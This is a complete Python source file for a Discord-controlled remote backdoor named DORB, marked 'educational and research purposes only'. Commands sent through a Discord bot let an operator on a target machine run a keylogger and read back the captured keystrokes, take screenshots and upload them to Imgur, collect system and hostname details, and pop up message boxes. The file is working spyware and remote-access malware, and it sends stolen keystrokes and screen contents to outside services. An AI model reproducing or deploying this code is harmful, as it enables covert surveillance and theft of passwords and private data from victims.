#!/usr/bin/env python3
"""
DORB - Discord Operational Remote Backdoor
Refactored for cross-platform compatibility (Windows, Linux, macOS)
Educational and research purposes only
"""

import discord
from discord.ext import commands
import pyautogui
import tempfile
import os
import sys
import platform
import logging
import time
import psutil
import threading
from typing import Dict, Callable, Optional, Any
from dataclasses import dataclass
from enum import Enum

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('dorb.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

class Platform(Enum):
    WINDOWS = "Windows"
    LINUX = "Linux"
    MACOS = "Darwin"
    UNKNOWN = "Unknown"

@dataclass
class PlatformCapabilities:
    """Stores platform-specific capabilities"""
    has_win32: bool = False
    has_x11: bool = False
    has_cocoa: bool = False
    messagebox_available: bool = False
    keylogger_available: bool = False

class PlatformDetector:
    """Detects current platform and available capabilities"""
    
    def __init__(self):
        self.system = platform.system()
        self.platform = self._detect_platform()
        self.capabilities = self._detect_capabilities()
        
    def _detect_platform(self) -> Platform:
        """Detect the current platform"""
        system_map = {
            "Windows": Platform.WINDOWS,
            "Linux": Platform.LINUX,
            "Darwin": Platform.MACOS
        }
        return system_map.get(self.system, Platform.UNKNOWN)
    
    def _detect_capabilities(self) -> PlatformCapabilities:
        """Detect platform-specific capabilities"""
        caps = PlatformCapabilities()
        
        if self.platform == Platform.WINDOWS:
            try:
                import win32api
                import win32gui
                import win32console
                import ctypes
                caps.has_win32 = True
                caps.messagebox_available = True
                caps.keylogger_available = True
                logger.info("🐍 Windows mode activated - All features available")
            except ImportError as e:
                logger.warning(f"⚠️ Windows modules not available: {e}")
                
        elif self.platform == Platform.LINUX:
            # Check for X11 display
            if os.environ.get('DISPLAY'):
                caps.has_x11 = True
                caps.messagebox_available = True
                logger.info("🐧 Linux mode - X11 detected")
            else:
                logger.warning("🐧 Linux mode - No X11 display found")
                
            # Check for keylogger capabilities
            try:
                import pynput
                caps.keylogger_available = True
            except ImportError:
                logger.warning("🐧 Keylogger not available - pynput missing")
                
        elif self.platform == Platform.MACOS:
            try:
                import Cocoa
                caps.has_cocoa = True
                caps.messagebox_available = True
                logger.info("🍎 macOS mode activated")
            except ImportError:
                logger.warning("🍎 macOS modules not available")
                
        return caps

class CrossPlatformMessageBox:
    """Cross-platform messagebox implementation"""
    
    def __init__(self, capabilities: PlatformCapabilities):
        self.capabilities = capabilities
        
    def show(self, title: str, message: str, style: int = 0) -> bool:
        """Show a messagebox on the current platform"""
        try:
            if self.capabilities.has_win32:
                return self._show_windows(title, message, style)
            elif self.capabilities.has_x11:
                return self._show_linux(title, message, style)
            elif self.capabilities.has_cocoa:
                return self._show_macos(title, message, style)
            else:
                logger.warning("No messagebox implementation available for this platform")
                return False
        except Exception as e:
            logger.error(f"Messagebox failed: {e}")
            return False
    
    def _show_windows(self, title: str, message: str, style: int) -> bool:
        """Windows messagebox using ctypes"""
        import ctypes
        ctypes.windll.user32.MessageBoxW(0, message, title, style)
        return True
    
    def _show_linux(self, title: str, message: str, style: int) -> bool:
        """Linux messagebox using zenity or kdialog"""
        import subprocess
        try:
            # Try zenity first (GNOME)
            subprocess.run(['zenity', '--info', '--title', title, '--text', message], 
                         check=True, capture_output=True)
            return True
        except (subprocess.CalledProcessError, FileNotFoundError):
            try:
                # Try kdialog (KDE)
                subprocess.run(['kdialog', '--title', title, '--msgbox', message], 
                             check=True, capture_output=True)
                return True
            except (subprocess.CalledProcessError, FileNotFoundError):
                logger.warning("No messagebox utility found (zenity/kdialog)")
                return False
    
    def _show_macos(self, title: str, message: str, style: int) -> bool:
        """macOS messagebox using osascript"""
        import subprocess
        try:
            applescript = f'display dialog "{message}" with title "{title}"'
            subprocess.run(['osascript', '-e', applescript], check=True, capture_output=True)
            return True
        except (subprocess.CalledProcessError, FileNotFoundError):
            return False

class KeyloggerManager:
    """Cross-platform keylogger management"""
    
    def __init__(self, capabilities: PlatformCapabilities):
        self.capabilities = capabilities
        self.is_logging = False
        self.listener = None
        self.keystrokes = []
        
    def start_logging(self) -> bool:
        """Start keylogging if available"""
        if not self.capabilities.keylogger_available:
            logger.warning("Keylogger not available on this platform")
            return False
            
        if self.is_logging:
            logger.warning("Keylogger already running")
            return False
            
        try:
            from pynput import keyboard
            
            def on_press(key):
                try:
                    self.keystrokes.append(f"{key.char}")
                except AttributeError:
                    self.keystrokes.append(f"[{key.name}]")
            
            self.listener = keyboard.Listener(on_press=on_press)
            self.listener.start()
            self.is_logging = True
            logger.info("Keylogger started")
            return True
            
        except Exception as e:
            logger.error(f"Failed to start keylogger: {e}")
            return False
    
    def stop_logging(self) -> str:
        """Stop keylogging and return captured keystrokes"""
        if not self.is_logging:
            return "Keylogger not running"
            
        try:
            if self.listener:
                self.listener.stop()
            self.is_logging = False
            result = ''.join(self.keystrokes)
            self.keystrokes.clear()
            logger.info("Keylogger stopped")
            return result
        except Exception as e:
            logger.error(f"Failed to stop keylogger: {e}")
            return f"Error: {e}"
    
    def get_keystrokes(self) -> str:
        """Get current keystrokes without stopping"""
        return ''.join(self.keystrokes)

class ScreenshotManager:
    """Cross-platform screenshot management"""
    
    def __init__(self):
        self.imgur_client = None
        
    def set_imgur_credentials(self, client_id: str = None, client_secret: str = None):
        """Set Imgur credentials for uploading (optional)"""
        if not client_id or not client_secret:
            logger.warning("Imgur credentials not provided - screenshots will be saved locally")
            return
            
        try:
            from imgurpython import ImgurClient
            # Test credentials by creating client
            test_client = ImgurClient(client_id, client_secret)
            # Try to get credits to validate credentials
            test_client.get_credits()
            self.imgur_client = test_client
            logger.info("Imgur client initialized successfully")
        except ImportError:
            logger.warning("imgurpython not available - screenshots will be saved locally")
        except Exception as e:
            logger.warning(f"Invalid Imgur credentials ({e}) - screenshots will be saved locally")
            self.imgur_client = None
    
    def take_screenshot(self) -> str:
        """Take screenshot and return path or URL"""
        try:
            screenshot = pyautogui.screenshot()
            
            if self.imgur_client:
                return self._upload_to_imgur(screenshot)
            else:
                return self._save_locally(screenshot)
                
        except Exception as e:
            logger.error(f"Screenshot failed: {e}")
            return f"Error: {e}"
    
    def _upload_to_imgur(self, screenshot) -> str:
        """Upload screenshot to Imgur"""
        with tempfile.NamedTemporaryFile(suffix='.png', delete=False) as temp_file:
            screenshot.save(temp_file.name)
            
            try:
                uploaded = self.imgur_client.upload_from_path(temp_file.name, anon=True)
                os.unlink(temp_file.name)  # Clean up temp file
                return uploaded['link']
            except Exception as e:
                os.unlink(temp_file.name)  # Clean up on error
                raise e
    
    def _save_locally(self, screenshot) -> str:
        """Save screenshot locally"""
        timestamp = int(time.time())
        filename = f"screenshot_{timestamp}.png"
        screenshot.save(filename)
        return f"Saved locally as {filename}"

class CommandHandler:
    """Main command handler with clean branching"""
    
    def __init__(self, platform_detector: PlatformDetector):
        self.detector = platform_detector
        self.messagebox = CrossPlatformMessageBox(platform_detector.capabilities)
        self.keylogger = KeyloggerManager(platform_detector.capabilities)
        self.screenshot = ScreenshotManager()
        self.commands: Dict[str, Callable] = {}
        self._register_commands()
        
    def _register_commands(self):
        """Register all available commands"""
        self.commands = {
            'help': self.cmd_help,
            'screenshot': self.cmd_screenshot,
            'keylog': self.cmd_keylog,
            'msgbox': self.cmd_msgbox,
            'info': self.cmd_info,
            'stop': self.cmd_stop,
            'keystrokes': self.cmd_keystrokes
        }
    
    async def handle_command(self, message: discord.Message) -> Optional[str]:
        """Handle incoming command and return response"""
        content = message.content.lower().strip()
        
        # Parse command and arguments
        parts = content.split(maxsplit=1)
        command = parts[0].lstrip('!')
        args = parts[1] if len(parts) > 1 else ""
        
        if command in self.commands:
            try:
                return await self.commands[command](args, message)
            except Exception as e:
                logger.error(f"Command '{command}' failed: {e}")
                return f"Error executing command: {e}"
        
        return None
    
    async def cmd_help(self, args: str, message: discord.Message) -> str:
        """Show available commands"""
        help_text = """
🔧 **DORB Commands:**
`!help` - Show this help message
`!info` - Show system information
`!screenshot` - Take and upload screenshot
`!keylog start` - Start keylogging
`!keylog stop` - Stop keylogging and get results
`!keystrokes` - Get current keystrokes (without stopping)
`!msgbox <message>` - Show messagebox on target system
`!stop` - Stop all active operations

🖥️ **Platform:** {}
🔒 **Features:** MessageBox: {}, Keylogger: {}
        """.format(
            self.detector.platform.value,
            "✅" if self.detector.capabilities.messagebox_available else "❌",
            "✅" if self.detector.capabilities.keylogger_available else "❌"
        )
        return help_text
    
    async def cmd_info(self, args: str, message: discord.Message) -> str:
        """Show system information"""
        info = f"""
🖥️ **System Information:**
Platform: {self.detector.platform.value}
Architecture: {platform.architecture()[0]}
Processor: {platform.processor()}
Python Version: {platform.python_version()}
Hostname: {platform.node()}
Memory: {psutil.virtual_memory().percent}% used
CPU: {psutil.cpu_percent()}% used
        """
        return info
    
    async def cmd_screenshot(self, args: str, message: discord.Message) -> str:
        """Take screenshot"""
        result = self.screenshot.take_screenshot()
        return f"📸 Screenshot: {result}"
    
    async def cmd_keylog(self, args: str, message: discord.Message) -> str:
        """Handle keylogging commands"""
        if args == "start":
            if self.keylogger.start_logging():
                return "🔑 Keylogger started"
            else:
                return "❌ Failed to start keylogger"
        elif args == "stop":
            result = self.keylogger.stop_logging()
            return f"🔑 Keylogger stopped. Captured: {result}"
        else:
            return "Usage: `!keylog start` or `!keylog stop`"
    
    async def cmd_keystrokes(self, args: str, message: discord.Message) -> str:
        """Get current keystrokes"""
        keystrokes = self.keylogger.get_keystrokes()
        if keystrokes:
            return f"🔑 Current keystrokes: {keystrokes}"
        else:
            return "No keystrokes captured yet"
    
    async def cmd_msgbox(self, args: str, message: discord.Message) -> str:
        """Show messagebox"""
        if not args:
            return "Usage: `!msgbox <message>`"
        
        if self.messagebox.show("DORB", args):
            return f"✅ Message displayed: {args}"
        else:
            return "❌ Failed to display message"
    
    async def cmd_stop(self, args: str, message: discord.Message) -> str:
        """Stop all operations"""
        if self.keylogger.is_logging:
            self.keylogger.stop_logging()
        return "🛑 All operations stopped"

class DORBBot:
    """Main DORB bot class"""
    
    def __init__(self, token: str, imgur_client_id: str = None, imgur_client_secret: str = None):
        self.token = token
        self.detector = PlatformDetector()
        self.command_handler = CommandHandler(self.detector)
        
        # Configure Discord bot
        intents = discord.Intents.default()
        intents.message_content = True
        self.bot = commands.Bot(command_prefix='!', intents=intents)
        
        # Setup Imgur if credentials provided (optional)
        self.command_handler.screenshot.set_imgur_credentials(imgur_client_id, imgur_client_secret)
        
        self._setup_events()
        
        logger.info(f"DORB initialized on {self.detector.platform.value}")
        logger.info(f"Capabilities: {self.detector.capabilities}")
    
    def _setup_events(self):
        """Setup Discord event handlers"""
        
        @self.bot.event
        async def on_ready():
            logger.info(f'Bot logged in as {self.bot.user}')
            logger.info(f'Bot ID: {self.bot.user.id}')
        
        @self.bot.event
        async def on_message(message):
            # Ignore bot's own messages
            if message.author == self.bot.user:
                return
            
            # Handle commands
            response = await self.command_handler.handle_command(message)
            if response:
                await message.channel.send(response)
    
    def run(self):
        """Start the bot"""
        try:
            self.bot.run(self.token)
        except Exception as e:
            logger.error(f"Bot failed to start: {e}")
            sys.exit(1)

def main():
    """Main entry point"""
    # Configuration - Replace with your actual credentials
    
    # Discord Bot Token (REQUIRED)
    DISCORD_TOKEN = "[Your_Discord_API_Key]"
    
    # Imgur API Credentials (OPTIONAL - for screenshot uploads)
    # Get your credentials from: https://api.imgur.com/oauth2/addclient
    # Leave as None to save screenshots locally instead
    IMGUR_CLIENT_ID = None  # e.g., "your_imgur_client_id"
    IMGUR_CLIENT_SECRET = None  # e.g., "your_imgur_client_secret"
    
    # Create and run bot
    bot = DORBBot(
        token=DISCORD_TOKEN,
        imgur_client_id=IMGUR_CLIENT_ID,
        imgur_client_secret=IMGUR_CLIENT_SECRET
    )
    bot.run()

if __name__ == "__main__":
    main()
